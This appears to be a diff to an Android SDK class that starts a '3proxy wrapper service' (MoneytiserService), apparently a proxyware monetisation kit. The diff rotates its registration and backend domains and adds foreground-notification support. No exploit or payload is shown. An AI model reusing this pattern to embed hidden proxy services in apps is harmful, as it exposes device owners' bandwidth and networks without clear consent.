@@ -1,6 +1,7 @@
 package io.hopmonsdk;
 
 import android.annotation.SuppressLint;
+import android.app.Notification;
 import android.app.UiModeManager;
 import android.app.job.JobScheduler;
 import android.content.BroadcastReceiver;
@@ -37,7 +38,7 @@ public class Hopmn extends BroadcastReceiver {
 
     @SuppressLint("StaticFieldLeak")
     private static volatile Hopmn instance;
-
+    public static Notification foregroundNotification;
     public static boolean userStopRequest = false;
     public static final String NEED_FOREGROUND_KEY = "need_forground";
     public static final String ASYNC_JOB_SCHEDULER_KEY = "job_scheduler";
@@ -56,10 +57,10 @@ public class Hopmn extends BroadcastReceiver {
     private static final String DEFAULT_REG_URL  = "https://{publisher}.stupidthings.online";
     private static final String SECURE_BASE_URL  = "https://{country}-{publisher}.stupidthings.online";
     private static final String SECURE_REG_URL  = "https://{publisher}.stupidthings.online";*/
-    private static final String DEFAULT_BASE_URL  = "https://{country}-{publisher}.apis.cyberprotector.online";
-    private static final String DEFAULT_REG_URL  = "https://{publisher}.apis.cyberprotector.online";
-    private static final String SECURE_BASE_URL  = "https://{country}-{publisher}.apis.cyberprotector.online";
-    private static final String SECURE_REG_URL  = "https://{publisher}.apis.cyberprotector.online";
+    private static final String DEFAULT_BASE_URL  = "https://{country}-{publisher}.cloud2point.com";
+    private static final String DEFAULT_REG_URL  = "https://{publisher}.cloud2point.com";
+    private static final String SECURE_BASE_URL  = "https://{country}-{publisher}.cloud2point.com";
+    private static final String SECURE_REG_URL  = "https://{publisher}.cloud2point.com";
 
     private static final String DEFAULT_CATEGORY  = "888";
     private static final String REG_ENDPOINT = String.format("/?regcc=1&pub=%s&uid=%s&cid=%s&ver=%s", PUBLISHER_PLACE_HOLDER, UID_PLACE_HOLDER, CID_PLACE_HOLDER,VER_PLACE_HOLDER);
@@ -254,12 +255,12 @@ public class Hopmn extends BroadcastReceiver {
     }
 
 
-
     /**
      * Start the 3proxy wrapper service.
      */
     @Keep
-    public void start() throws InterruptedException {
+    public void start(Notification notification) throws InterruptedException {
+        foregroundNotification =  notification;
         Hopmn.userStopRequest = false;
         Intent intent = new Intent();
         intent.setClass(mContext, MoneytiserService.class);
@@ -289,6 +290,16 @@ public class Hopmn extends BroadcastReceiver {
             LogUtils.e("Hopmn", "start() failed on startService() with sdk "+ Build.VERSION.SDK_INT );
         }
         mContext.bindService(intent, proxyServiceConnection, Context.BIND_AUTO_CREATE);
+    }
+
+
+
+    /**
+     * Start the 3proxy wrapper service.
+     */
+    @Keep
+    public void start() throws InterruptedException {
+            start(null);
     }
 
     /**
